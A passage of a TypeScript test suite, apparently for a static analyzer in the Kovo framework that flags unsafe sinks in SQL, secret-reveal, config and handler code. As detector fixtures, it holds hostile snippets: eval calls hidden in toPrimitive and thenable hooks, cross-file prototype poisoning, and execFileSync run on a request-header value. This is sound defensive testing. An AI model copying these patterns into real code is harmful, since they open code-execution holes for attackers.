        facts.some((fact) => fact.sink === 'eval' || fact.sink.startsWith('request-handler.')),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }
  });

  it('keeps staticSql results and opaque consumers closed outside the reviewed DB use', () => {
    const wireFacts = sinksFor(`
      import { staticSql } from '@kovojs/drizzle';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ handler() {
        return staticSql\`select 1\`;
      } });
    `);
    expect(wireFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'client-wire.request.opaque-tag-result' }),
      ]),
    );

    const consumerFacts = sinksFor(`
      import { staticSql } from '@kovojs/drizzle';
      import { consume } from 'opaque-consumer';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ handler() {
        consume(staticSql\`select 1\`);
        return { ok: true };
      } });
    `);
    expect(consumerFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'request-handler.opaque-package-call' }),
      ]),
    );
  });

  it('accepts only exact canonical Kovo trusted SQL construction', () => {
    const safe = sinksFor(`
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { mutation, serverValue } from '@kovojs/server';
      export const write = mutation({ handler(input) {
        trustedSql(
          sql\`update contacts set name = \${input.name} where id = \${serverValue('c1', 'server-owned id')}\`,
          { justification: 'reviewed contact update' },
        );
        trustedSql(sql.raw<{ id: string }>('select id from contacts'), {
          justification: 'reviewed static report',
        });
        return { ok: true };
      } });
    `);
    expect(safe).toEqual([]);

    for (const [label, statement, options = `{ justification: 'reviewed' }`] of [
      ['dynamic raw text', `sql.raw(input.statement)`],
      ['arbitrary statement', `input.statement`],
      ['indirect statement', `statement`],
      ['unreviewed Kovo constructor', `sql.identifier(input.name)`],
      ['blank justification', `sql\`select 1\``, `{ justification: '   ' }`],
      ['dynamic justification', `sql\`select 1\``, `{ justification: input.reason }`],
      ['shorthand justification', `sql\`select 1\``, `{ justification }`],
      ['computed justification', `sql\`select 1\``, `{ ['justification']: 'reviewed' }`],
      ['spread options', `sql\`select 1\``, `{ ...{ justification: 'reviewed' } }`],
      ['getter justification', `sql\`select 1\``, `{ get justification() { return 'reviewed'; } }`],
    ] as const) {
      const prelude =
        label === 'indirect statement'
          ? `const statement = sql\`select 1\`;`
          : label === 'shorthand justification'
            ? `const justification = 'reviewed';`
            : '';
      const facts = sinksFor(`
        import { sql, trustedSql } from '@kovojs/drizzle';
        import { mutation } from '@kovojs/server';
        ${prelude}
        export const write = mutation({ handler(input) {
          trustedSql(${statement}, ${options});
          return { ok: true };
        } });
      `);
      expect(
        facts.some(
          (fact) =>
            fact.source === 'trustedSql' ||
            fact.source === 'sql.raw' ||
            fact.source === '<tagged-template:sql>',
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    const hostileInterpolation = sinksFor(`
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ handler() {
        trustedSql(sql\`select \${{ [Symbol.toPrimitive]() { eval('owned'); return 1; } }}\`, {
          justification: 'reviewed coercion proof',
        });
        return { ok: true };
      } });
    `);
    expect(hostileInterpolation).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'eval' })]),
    );

    for (const [label, source] of [
      [
        'aliased imports',
        `
          import { sql as querySql, trustedSql as reviewed } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            reviewed(querySql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'namespace import',
        `
          import * as drizzle from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            drizzle.trustedSql(drizzle.sql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'local wrapper',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const reviewed = trustedSql;
          export const write = mutation({ handler() {
            reviewed(sql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'call adapter',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            trustedSql.call(undefined, sql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'optional invocation',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            trustedSql?.(sql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'computed raw member',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            trustedSql(sql['raw']('select 1'), { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'conditional statement',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler(input) {
            trustedSql(input.ok ? sql\`select 1\` : sql\`select 2\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'foreign SQL tag',
        `
          import { trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          import { sql } from 'drizzle-orm';
          export const write = mutation({ handler() {
            trustedSql(sql\`select 1\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'extra argument',
        `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler() {
            trustedSql(sql\`select 1\`, { justification: 'reviewed' }, 'extra');
            return { ok: true };
          } });
        `,
      ],
    ] as const) {
      const facts = sinksFor(source);
      expect(
        facts.some(
          (fact) =>
            fact.source?.includes('trustedSql') ||
            fact.source?.includes('tagged-template') ||
            fact.source?.includes('sql'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    const leakedCarrier = sinksForFiles([
      {
        fileName: 'write.ts',
        source: `
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const leakedSql = sql;
          export const write = mutation({ handler() {
            trustedSql(sql.raw('select 1'), { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      },
      {
        fileName: 'poison.ts',
        source: `
          import { leakedSql } from './write.js';
          leakedSql.raw = () => ({ then() { eval('owned'); } });
        `,
      },
    ]);
    expect(leakedCarrier).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          site: expect.stringMatching(/^write\.ts:/u),
          source: 'trustedSql',
        }),
      ]),
    );

    const mutatedStatement = sinksFor(`
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ handler() {
        const statement = trustedSql(sql.raw('select 1'), { justification: 'reviewed' });
        Object.defineProperty(statement, 'then', {
          get() { eval('owned'); return undefined; },
        });
        return statement;
      } });
    `);
    expect(mutatedStatement).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'eval' })]),
    );
  });

  it('accepts only the exact pristine secret constructor as a protocol-safe value', () => {
    const safe = sinksFor(`
      import { secret } from '@kovojs/core';
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { mutation } from '@kovojs/server';
      export const write = mutation({ handler(input) {
        trustedSql(sql\`insert into vault (classified) values (\${secret(input.value)})\`, {
          justification: 'box classified mutation input before persistence',
        });
        return { ok: true };
      } });
    `);
    expect(safe).toEqual([]);

    for (const [label, source] of [
      [
        'aliased import',
        `
          import { secret as makeSecret } from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${makeSecret(input.value)}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'namespace import',
        `
          import * as core from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${core.secret(input.value)}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'local wrapper',
        `
          import { secret } from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          const makeSecret = secret;
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${makeSecret(input.value)}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'call adapter',
        `
          import { secret } from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${secret.call(undefined, input.value)}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
      [
        'extra argument',
        `
          import { secret } from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${secret(input.value, 'forged')}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      ],
    ] as const) {
      const facts = sinksFor(source);
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('app.tsx:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source' ||
              fact.sink === 'request-handler.toPrimitive'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    const escapedCarrier = sinksForFiles([
      {
        fileName: 'write.ts',
        source: `
          import { secret } from '@kovojs/core';
          import { sql, trustedSql } from '@kovojs/drizzle';
          import { mutation } from '@kovojs/server';
          export { secret };
          export const write = mutation({ handler(input) {
            trustedSql(sql\`select \${secret(input.value)}\`, { justification: 'reviewed' });
            return { ok: true };
          } });
        `,
      },
      {
        fileName: 'poison.ts',
        source: `
          import { secret } from './write.js';
          Object.defineProperty(secret, 'call', { value() { eval('owned'); } });
        `,
      },
    ]);
    expect(escapedCarrier).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          site: expect.stringMatching(/^write\.ts:/u),
          sink: expect.stringMatching(/^request-handler\./u),
        }),
      ]),
    );
  });

  it('accepts only an exact direct declared secret-read statement and DB execution', () => {
    const bridge = {
      fileName: '_kovo/app-runtime-db.ts',
      source: `
        import { declareSecretReadCapability } from '@kovojs/server';
        export { declareSecretReadCapability };
      `,
    };
    const querySource = `
      import { sql, trustedSql } from '@kovojs/drizzle';
      import { declareSecretReadCapability, query } from '@kovojs/server';
      export const secretRows = query({ async load(_input, context) {
        if (context?.db === undefined) throw new Error('missing query DB');
        const statement = trustedSql(sql.raw('select id, classified from runtime_secret_proof'), {
          justification: 'reviewed raw secret read',
        });
        declareSecretReadCapability(statement, {
          columns: ['classified'],
          justification: 'audit classified values on the server',
          source: 'runtime_secret_proof.classified',
          table: 'runtime_secret_proof',
        });
        const rows = await (context.db as unknown as { all(value: unknown): Promise<unknown[]> }).all(statement);
        return { items: rows };
      } });
    `;
    const exactFiles = [{ fileName: 'queries.ts', source: querySource }];
    expect(sinksForFiles(exactFiles)).toEqual([]);

    const executeSource = querySource
      .replace(
        '{ all(value: unknown): Promise<unknown[]> }).all(statement)',
        '{ execute(value: unknown): Promise<{ rows: unknown[] }> }).execute(statement)',
      )
      .replace('return { items: rows };', 'return { items: rows.rows };');
    expect(sinksForFiles([{ fileName: 'queries.ts', source: executeSource }])).toEqual([]);

    for (const [label, source] of [
      [
        'aliased package import',
        querySource
          .replace(
            'import { declareSecretReadCapability, query }',
            'import { declareSecretReadCapability as declareRead, query }',
          )
          .replace('declareSecretReadCapability(statement, {', 'declareRead(statement, {'),
      ],
      [
        'namespace package import',
        querySource
          .replace(
            "import { declareSecretReadCapability, query } from '@kovojs/server';",
            "import * as server from '@kovojs/server';\n      import { query } from '@kovojs/server';",
          )
          .replace(
            'declareSecretReadCapability(statement, {',
            'server.declareSecretReadCapability(statement, {',
          ),
      ],
      [
        'generated bridge import',
        querySource.replace(
          "import { declareSecretReadCapability, query } from '@kovojs/server';",
          "import { query } from '@kovojs/server';\n      import { declareSecretReadCapability } from './_kovo/app-runtime-db.js';",
        ),
      ],
      [
        'statement alias',
        querySource
          .replace(
            'declareSecretReadCapability(statement, {',
            'const escapedStatement = statement;\n        declareSecretReadCapability(statement, {',
          )
          .replace('}).all(statement);', '}).all(escapedStatement);'),
      ],
      [
        'dynamic SQL',
        querySource
          .replace('async load(_input, context)', 'async load(input, context)')
          .replace(
            "sql.raw('select id, classified from runtime_secret_proof')",
            'sql.raw(input.statement)',
          ),
      ],
      [
        'dynamic columns',
        querySource
          .replace('async load(_input, context)', 'async load(input, context)')
          .replace("columns: ['classified']", 'columns: [input.column]'),
      ],
      [
        'spread declaration',
        querySource.replace("columns: ['classified'],", "...{ columns: ['classified'] },"),
      ],
      [
        'extra declaration field',
        querySource.replace(
          "table: 'runtime_secret_proof',",
          "table: 'runtime_secret_proof',\n          reason: 'forged',",
        ),
      ],
      [
        'execution before declaration',
        querySource.replace(
          /        declareSecretReadCapability\(statement, \{[\s\S]*?        \}\);\n        const rows = ([^;]+);/u,
          "        const rows = $1;\n        declareSecretReadCapability(statement, {\n          columns: ['classified'],\n          justification: 'audit classified values on the server',\n          source: 'runtime_secret_proof.classified',\n          table: 'runtime_secret_proof',\n        });",
        ),
      ],
      [
        'computed execution method',
        querySource.replace('}).all(statement)', "})['all'](statement)"),
      ],
      [
        'extra execution argument',
        querySource.replace('}).all(statement)', '}).all(statement, undefined)'),
      ],
      [
        'opaque receiver',
        querySource
          .replace('async load(_input, context)', 'async load(input, context)')
          .replace('(context.db as unknown as', '(input.db as unknown as'),
      ],
      [
        'multiple executions',
        querySource.replace(
          'const rows = await',
          'await (context.db as unknown as { all(value: unknown): Promise<unknown[]> }).all(statement);\n        const rows = await',
        ),
      ],
    ] as const) {
      const facts = sinksForFiles([
        ...(label === 'generated bridge import' ? [bridge] : []),
        { fileName: 'queries.ts', source },
      ]);
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('queries.ts:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source' ||
              fact.sink === 'request-handler.opaque-thenable'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    const poisonedPackageCarrier = sinksForFiles([
      { fileName: 'queries.ts', source: querySource },
      {
        fileName: 'poison.ts',
        source: `
          export { declareSecretReadCapability } from '@kovojs/server';
        `,
      },
    ]);
    expect(
      poisonedPackageCarrier.some(
        (fact) => fact.site.startsWith('queries.ts:') && fact.sink.startsWith('request-handler.'),
      ),
      JSON.stringify(poisonedPackageCarrier),
    ).toBe(true);
  });

  it('keeps exact trustedReveal audited without laundering its input authority', () => {
    const safe = sinksFor(`
      import { secret, trustedReveal } from '@kovojs/core';
      import { query } from '@kovojs/server';
      export const revealed = query({ load() {
        const value = trustedReveal(secret('classified'), {
          justification: 'publish the reviewed fixture value',
          method: 'arbitrary-fn',
          source: 'fixture.classified',
        });
        return { value: \`${'${value}'}:reviewed\` };
      } });
    `);
    expect(safe).toEqual([]);

    for (const [label, source] of [
      [
        'aliased import',
        `
          import { trustedReveal as reveal } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return reveal(input.value, { justification: 'reviewed' });
          } });
        `,
      ],
      [
        'namespace import',
        `
          import * as core from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return core.trustedReveal(input.value, { justification: 'reviewed' });
          } });
        `,
      ],
      [
        'dynamic justification',
        `
          import { trustedReveal } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return trustedReveal(input.value, { justification: input.reason });
          } });
        `,
      ],
      [
        'spread options',
        `
          import { trustedReveal } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return trustedReveal(input.value, { ...{ justification: 'reviewed' } });
          } });
        `,
      ],
      [
        'invalid method',
        `
          import { trustedReveal } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return trustedReveal(input.value, { justification: 'reviewed', method: 'identity' });
          } });
        `,
      ],
      [
        'extra option',
        `
          import { trustedReveal } from '@kovojs/core';
          import { query } from '@kovojs/server';
          export const exposed = query({ load(input) {
            return trustedReveal(input.value, { justification: 'reviewed', reason: 'forged' });
          } });
        `,
      ],
    ] as const) {
      const facts = sinksFor(source);
      expect(
        facts.some(
          (fact) =>
            fact.site.startsWith('app.tsx:') &&
            (fact.sink === 'request-handler.opaque-call' ||
              fact.sink === 'request-handler.opaque-protocol' ||
              fact.sink === 'request-handler.opaque-source'),
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    for (const [label, value] of [
      ['direct context authority', 'context'],
      ['secret-wrapped context authority', 'secret(context)'],
    ] as const) {
      const facts = sinksFor(`
        import { secret, trustedReveal, type Secret } from '@kovojs/core';
        import { query } from '@kovojs/server';
        export const exposed = query({ load(_input, context) {
          return trustedReveal(${value} as unknown as Secret<unknown>, {
            justification: 'attempted authority laundering proof',
            method: 'arbitrary-fn',
          });
        } });
      `);
      expect(
        facts.some(
          (fact) =>
            fact.sink.startsWith('client-wire.') || fact.sink === 'request-handler.opaque-protocol',
        ),
        `${label}: ${JSON.stringify(facts)}`,
      ).toBe(true);
    }

    const hostileProtocol = sinksFor(`
      import { trustedReveal, type Secret } from '@kovojs/core';
      import { query } from '@kovojs/server';
      export const exposed = query({ load() {
        const hostile = {
          [Symbol.toPrimitive]() { eval('owned'); return 'value'; },
          then() { eval('assimilated'); },
        };
        return \`${"${trustedReveal(hostile as unknown as Secret<string>, { justification: 'reviewed' })}"}\`;
      } });
    `);
    expect(hostileProtocol).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'eval', source: "'owned'" }),
        expect.objectContaining({ sink: 'eval', source: "'assimilated'" }),
      ]),
    );
  });

  it('keeps generated database and auth setup constructors at module initialization', () => {
    const sqliteFacts = sinksForFiles([
      {
        fileName: 'schema.ts',
        source: `
          import { sqliteTable, text } from 'drizzle-orm/sqlite-core';
          export const contacts = sqliteTable('contacts', { id: text('id').primaryKey() });
        `,
      },
      {
        fileName: '_kovo/unsafe.ts',
        source: `
          import { mutation, publicAccess } from '@kovojs/server';
          import { createSqliteAppRuntime } from '@kovojs/server/sqlite';
          import * as schema from '../schema.js';
          const APP_TABLES = [schema.contacts];
          const APP_SEED = [{ table: schema.contacts, rows: [{ id: 'c1' }] }];
          export const unsafe = mutation({
            access: publicAccess('fixture'),
            handler() {
              const runtime = createSqliteAppRuntime({ seed: APP_SEED, tables: APP_TABLES });
              void runtime;
              return null;
            },
          });
        `,
      },
    ]);
    expect(sqliteFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createSqliteAppRuntime',
        }),
      ]),
    );

    const postgresFacts = sinksFor(`
      import { createPostgresAppRuntimeDb, mutation, publicAccess } from '@kovojs/server';
      export const unsafe = mutation({
        access: publicAccess('fixture'),
        handler(input) {
          return createPostgresAppRuntimeDb({
            databaseUrl: input.databaseUrl,
            dataDir: input.dataDir,
            driver: input.driver,
            schema: input.schema,
          });
        },
      });
    `);
    expect(postgresFacts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createPostgresAppRuntimeDb',
        }),
      ]),
    );

    const hostilePrincipalMapper = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createPostgresAppRuntimeDb } from '@kovojs/server';
      export const runtime = createPostgresAppRuntimeDb({
        schema: {},
        principalFromRequest(request) {
          execFileSync(request.headers.get('x-program'));
          return request.headers.get('x-user') ?? undefined;
        },
      });
    `);
    expect(hostilePrincipalMapper).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ sink: 'child_process.execFileSync' }),
        expect.objectContaining({
          sink: 'request-handler.opaque-call',
          source: 'createPostgresAppRuntimeDb',
        }),
      ]),
    );
  });

  it('does not grant app code raw Postgres DB authority through the internal subpath', () => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      import { usePostgresAppRuntimeDb } from '@kovojs/server/internal/postgres-capability';
      const forgedRuntime = {};
      export const unsafe = query({ load(input) {
        const rawDb = usePostgresAppRuntimeDb(forgedRuntime, input);
        return rawDb.execute(input.sql);
      } });
    `);
    expect(facts).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-module-initializer:@kovojs/server/internal/postgres-capability>',
        }),
        expect.objectContaining({ sink: 'request-handler.opaque-call', source: 'rawDb.execute' }),
      ]),
    );
  });

  it('accepts only the exact static generated client-module registry grammar', () => {
    const facts = sinksFor(`
      import {
        createApp,
        createMemoryVersionedClientModuleRegistry,
        stylesheet,
      } from '@kovojs/server';
      const clientModules = createMemoryVersionedClientModuleRegistry();
      clientModules.put({
        contentType: 'text/javascript; charset=utf-8',
        path: '/c/cart.client.js',
        source: 'export const cartClient = true;',
        version: 'cart-v1',
      });
      export default createApp({
        clientModules,
        routes: [],
        stylesheets: [stylesheet('./local.css')],
      });
    `);

    expect(facts).toEqual([]);
  });

  it.each([
    [
      'an aliased registry receiver',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       const alias = clientModules;
       alias.put({ path: '/c/x.js', source: 'export {};', version: 'v1' });`,
    ],
    [
      'a reassigned registry binding',
      `let clientModules = createMemoryVersionedClientModuleRegistry();
       clientModules = createMemoryVersionedClientModuleRegistry();`,
    ],
    [
      'a proxied registry',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       new Proxy(clientModules, {});`,
    ],
    [
      'a registry constructed inside a helper',
      `function makeRegistry() { return createMemoryVersionedClientModuleRegistry(); }
       const clientModules = makeRegistry();`,
    ],
    [
      'an aliased constructor',
      `const makeRegistry = createMemoryVersionedClientModuleRegistry;
       const clientModules = makeRegistry();`,
    ],
    [
      'a put call inside a handler',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       const page = route('/', {
         page(request) {
           clientModules.put({ path: '/c/x.js', source: request.url, version: 'v1' });
           return 'ok';
         },
       });`,
    ],
    [
      'a computed put call',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       clientModules['put']({ path: '/c/x.js', source: 'export {};', version: 'v1' });`,
    ],
    [
      'an aliased module record',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       const moduleRecord = { path: '/c/x.js', source: 'export {};', version: 'v1' };
       clientModules.put(moduleRecord);`,
    ],
    [
      'a spread module record',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       const moduleRecord = { path: '/c/x.js', source: 'export {};', version: 'v1' };
       clientModules.put({ ...moduleRecord });`,
    ],
    [
      'a replaced put method',
      `const clientModules = createMemoryVersionedClientModuleRegistry();
       Object.defineProperty(clientModules, 'put', { value() {} });`,
    ],
  ])('fails closed for generated client-module registry derived through %s', (_label, setup) => {
    const facts = sinksFor(`
      import {
        createApp,
        createMemoryVersionedClientModuleRegistry,
        route,
      } from '@kovojs/server';
      ${setup}
      export default createApp({ clientModules, routes: [] });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([expect.objectContaining({ sink: 'request-handler.opaque-source' })]),
    );
  });

  it('does not whitelist a local stylesheet lookalike in retained app config', () => {
    const facts = sinksFor(`
      import { createApp } from '@kovojs/server';
      const stylesheet = (source) => ({ href: source });
      export default createApp({ routes: [], stylesheets: [stylesheet('./local.css')] });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it('classifies many retained-config definitions and aliases within a low-second bound', () => {
    const accessAliases = Array.from({ length: 16 }, (_unused, index) =>
      index === 0
        ? 'const access0 = [guards.authed()];'
        : `const access${index} = access${index - 1};`,
    ).join('\n');
    const outputAliases = Array.from({ length: 16 }, (_unused, index) =>
      index === 0
        ? 'const output0 = { parse(value) { return value; } };'
        : `const output${index} = output${index - 1};`,
    ).join('\n');
    const definitions = Array.from(
      { length: 32 },
      (_unused, index) => `export const read${index} = query({
        access: access15,
        output: output15,
        load() { return { index: ${index} }; },
      });`,
    ).join('\n');
    const started = Date.now();
    const facts = sinksFor(`
      import { guards, query } from '@kovojs/server';
      ${accessAliases}
      ${outputAliases}
      ${definitions}
    `);

    expect(facts).toEqual([]);
    expect(Date.now() - started).toBeLessThan(3_000);
  });

  it.each([
    [
      'app helper result',
      `function makeOutput() { return { parse(value) { return value; } }; }
       const output = makeOutput();`,
    ],
    [
      'app constructor result',
      `class OutputSchema { parse(value) { return value; } }
       const output = new OutputSchema();`,
    ],
    [
      'accessor result',
      `const holder = { get output() { return { parse(value) { return value; } }; } };
       const output = holder.output;`,
    ],
    [
      'computed method name',
      `function makeKey() { return 'parse'; }
       const output = { [makeKey()](value) { return value; } };`,
    ],
    [
      'object-literal prototype setter',
      `const output = { __proto__: { parse(value) { return value; } } };`,
    ],
    [
      'arbitrary method on an Object.freeze result',
      `const output = Object.freeze({
         make() { return { parse(value) { return value; } }; },
       }).make();`,
    ],
    [
      'a replaced framework schema namespace constructor',
      `import { execFileSync } from 'node:child_process';
       import { s } from '@kovojs/server';
       (s as any).string = () => ({
         parse(value) { execFileSync('poisoned-schema-namespace'); return value; },
       });
       const output = s.string();`,
    ],
    [
      'a replaced framework schema refinement prototype',
      `import { execFileSync } from 'node:child_process';
       import { s } from '@kovojs/server';
       const prototype = Object.getPrototypeOf(s.string()) as any;
       prototype.optional = () => ({
         parse(value) { execFileSync('poisoned-schema-refinement'); return value; },
       });
       const output = s.string().optional();`,
    ],
  ])('fails closed for retained config derived through %s', (_label, setup) => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      ${setup}
      export const read = query({
        output,
        load() { return { ok: true }; },
      });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it.each([
    [
      'default parameter',
      `const output = { parse(value) { return value; } };
       function poison(alias = output) { alias.parse = (value) => value; }
       poison();`,
      '<mutated-retained-config>',
    ],
    [
      'class field',
      `const output = { parse(value) { return value; } };
       class Poisoner {
         target = output;
         run() { this.target.parse = (value) => value; }
       }
       new Poisoner().run();`,
      '<mutated-retained-config>',
    ],
    [
      'constructor return',
      `const shared = { parse(value) { return value; } };
       class OutputFactory { constructor() { return shared; } }
       const output = new OutputFactory();
       shared.parse = (value) => value;`,
      '<opaque-retained-config-derivation>',
    ],
    [
      'function prototype',
      `const prototype = { parse(value) { return value; } };
       function OutputSchema() {}
       OutputSchema.prototype = prototype;
       const output = new OutputSchema();
       prototype.parse = (value) => value;`,
      '<opaque-retained-config-derivation>',
    ],
  ])('links retained schema identity through %s', (_label, setup, expectedSource) => {
    const facts = sinksFor(`
      import { query } from '@kovojs/server';
      ${setup}
      export const read = query({
        output,
        load() { return { ok: true }; },
      });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: expectedSource,
        }),
      ]),
    );
  });

  it('rejects prototype replacement on retained schema instances', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { query } from '@kovojs/server';
      class OutputSchema {
        parse(value) { return value; }
      }
      OutputSchema.prototype.parse = function hostile(value) {
        execFileSync('prototype-output');
        return value;
      };
      const output = new OutputSchema();
      export const read = query({
        output,
        load() { return { ok: true }; },
      });
    `);

    expect(facts, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          sink: 'request-handler.opaque-source',
          source: '<opaque-retained-config-derivation>',
        }),
      ]),
    );
  });

  it('traverses inherited schema, replay, registry, and mutation-replay adapter methods', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { createApp, query, webhook } from '@kovojs/server';
      class BaseSchema {
        parse(value) { execFileSync('schema-parse'); return value; }
        parseAsync(value) { execFileSync('schema-parse-async'); return value; }
      }
      class Schema extends BaseSchema {}
      class BaseReplay {
        get() { execFileSync('replay-get'); return undefined; }
        reserve() { execFileSync('replay-reserve'); return { commit() {}, abort() {} }; }
        set() { execFileSync('replay-set'); }
      }
      class Replay extends BaseReplay {}
      class BaseRegistry {
        buildToken() { execFileSync('registry-build'); return 'build'; }
        resolve() { execFileSync('registry-resolve'); return { body: '', headers: {}, status: 200 }; }
      }
      class Registry extends BaseRegistry {}
      const schema = new Schema();
      const replay = new Replay();
      const hook = webhook('/hook', { handler() { return {}; }, input: schema, replayStore: replay });
      createApp({
        clientModules: new Registry(),
        endpoints: [hook],
        mutationReplayStore: replay,
        queries: [query('q', { args: schema, load() { return 'ok'; } })],
      });
    `);
    const sources = facts
      .filter((fact) => fact.sink === 'child_process.execFileSync')
      .map((fact) => fact.source);
    expect(sources, JSON.stringify(facts)).toEqual(
      expect.arrayContaining([
        "'registry-build'",
        "'registry-resolve'",
        "'replay-get'",
        "'replay-reserve'",
        "'replay-set'",
        "'schema-parse'",
        "'schema-parse-async'",
      ]),
    );
  });

  it('closes factory laundering through aggregate selectors and namespace copies', () => {
    const facts = sinksFor(`
      import { execFileSync } from 'node:child_process';
      import { endpoint } from '@kovojs/server';
      import * as serverApi from '@kovojs/server';
      const response = { appOwnedSafety: true, body: 'text', cache: 'no-store' };
      [endpoint].at(0)('/at', { handler() { execFileSync('array-at'); return new Response('ok'); }, method: 'GET', reason: 'at', response });
      new Map([['x', endpoint]]).get('x')('/map', { handler() { execFileSync('map-get'); return new Response('ok'); }, method: 'GET', reason: 'map', response });
